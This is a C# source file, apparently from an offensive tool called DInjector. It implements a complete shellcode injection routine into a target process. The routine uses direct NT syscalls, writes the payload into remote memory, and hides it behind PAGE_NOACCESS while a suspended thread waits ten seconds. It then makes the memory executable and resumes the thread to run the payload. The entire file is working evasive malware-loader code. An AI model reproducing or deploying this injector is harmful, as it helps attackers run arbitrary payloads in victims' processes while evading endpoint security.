using System;
using System.Runtime.InteropServices;

using DI = DInvoke;

namespace DInjector
{
    class RemoteThreadSuspended
    {
        public static void Execute(byte[] shellcode, int processID)
        {
            #region NtOpenProcess

            IntPtr hProcess = IntPtr.Zero;
            Win32.OBJECT_ATTRIBUTES oa = new Win32.OBJECT_ATTRIBUTES();
            Win32.CLIENT_ID ci = new Win32.CLIENT_ID { UniqueProcess = (IntPtr)processID };

            var ntstatus = Syscalls.NtOpenProcess(
                ref hProcess,
                DI.Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_ALL_ACCESS,
                ref oa,
                ref ci);

            if (ntstatus == 0)
                Console.WriteLine("(RemoteThreadSuspended) [+] NtOpenProcess");
            else
                Console.WriteLine($"(RemoteThreadSuspended) [-] NtOpenProcess: {ntstatus}");

            #endregion

            #region NtAllocateVirtualMemory (PAGE_READWRITE)

            IntPtr baseAddress = IntPtr.Zero;
            IntPtr regionSize = (IntPtr)shellcode.Length;

            ntstatus = Syscalls.NtAllocateVirtualMemory(
                hProcess,
                ref baseAddress,
                IntPtr.Zero,
                ref regionSize,
                DI.Data.Win32.Kernel32.MEM_COMMIT | DI.Data.Win32.Kernel32.MEM_RESERVE,
                DI.Data.Win32.WinNT.PAGE_READWRITE);

            if (ntstatus == 0)
                Console.WriteLine("(RemoteThreadSuspended) [+] NtAllocateVirtualMemory, PAGE_READWRITE");
            else
                Console.WriteLine($"(RemoteThreadSuspended) [-] NtAllocateVirtualMemory, PAGE_READWRITE: {ntstatus}");

            #endregion

            #region NtWriteVirtualMemory

            var buffer = Marshal.AllocHGlobal(shellcode.Length);
            Marshal.Copy(shellcode, 0, buffer, shellcode.Length);

            uint bytesWritten = 0;

            ntstatus = Syscalls.NtWriteVirtualMemory(
                hProcess,
                baseAddress,
                buffer,
                (uint)shellcode.Length,
                ref bytesWritten);

            if (ntstatus == 0)
                Console.WriteLine("(RemoteThreadSuspended) [+] NtWriteVirtualMemory");
            else
                Console.WriteLine($"(RemoteThreadSuspended) [-] NtWriteVirtualMemory: {ntstatus}");

            Marshal.FreeHGlobal(buffer);

            #endregion

            #region NtProtectVirtualMemory (PAGE_NOACCESS)

            uint oldProtect = 0;

            ntstatus = Syscalls.NtProtectVirtualMemory(
                hProcess,
                ref baseAddress,
                ref regionSize,
                DI.Data.Win32.WinNT.PAGE_NOACCESS,
                ref oldProtect);

            if (ntstatus == 0)
                Console.WriteLine("(RemoteThreadSuspended) [+] NtProtectVirtualMemory, PAGE_NOACCESS");
            else
                Console.WriteLine($"(RemoteThreadSuspended) [-] NtProtectVirtualMemory, PAGE_NOACCESS: {ntstatus}");

            #endregion

            #region NtCreateThreadEx (CREATE_SUSPENDED)

            IntPtr hThread = IntPtr.Zero;

            ntstatus = Syscalls.NtCreateThreadEx(
                ref hThread,
                DI.Data.Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED,
                IntPtr.Zero,
                hProcess,
                baseAddress,
                IntPtr.Zero,
                true, // CREATE_SUSPENDED
                0,
                0,
                0,
                IntPtr.Zero);

            if (ntstatus == 0)
                Console.WriteLine("(RemoteThreadSuspended) [+] NtCreateThreadEx, CREATE_SUSPENDED");
            else
                Console.WriteLine($"(RemoteThreadSuspended) [-] NtCreateThreadEx, CREATE_SUSPENDED: {ntstatus}");

            #endregion

            #region Thread.Sleep

            System.Threading.Thread.Sleep(10000);

            #endregion

            #region NtProtectVirtualMemory (PAGE_EXECUTE_READ)

            oldProtect = 0;

            ntstatus = Syscalls.NtProtectVirtualMemory(
                hProcess,
                ref baseAddress,
                ref regionSize,
                DI.Data.Win32.WinNT.PAGE_EXECUTE_READ,
                ref oldProtect);

            if (ntstatus == 0)
                Console.WriteLine("(RemoteThreadSuspended) [+] NtProtectVirtualMemory, PAGE_EXECUTE_READ");
            else
                Console.WriteLine($"(RemoteThreadSuspended) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READ: {ntstatus}");

            #endregion

            #region NtResumeThread

            uint suspendCount = 0;

            ntstatus = Syscalls.NtResumeThread(
                hThread,
                ref suspendCount);

            if (ntstatus == 0)
                Console.WriteLine("(RemoteThreadSuspended) [+] NtResumeThread");
            else
                Console.WriteLine($"(RemoteThreadSuspended) [-] NtResumeThread: {ntstatus}");

            #endregion

            Win32.CloseHandle(hThread);
            Win32.CloseHandle(hProcess);
        }
    }
}
